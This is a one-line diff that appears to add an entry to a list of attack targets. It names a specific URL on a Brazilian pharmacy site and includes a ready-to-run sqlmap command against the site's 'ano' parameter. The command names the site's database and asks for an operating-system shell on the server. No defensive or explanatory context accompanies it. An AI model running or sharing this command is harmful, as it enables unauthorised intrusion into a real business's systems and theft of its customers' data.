@@ -1,0 +1,1 @@
+https://www.economicanet.com.br/blog.php?ano=2016 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.economicanet.com.br/blog.php?ano=2016 -D economic_drogariaeconomica --os-shell
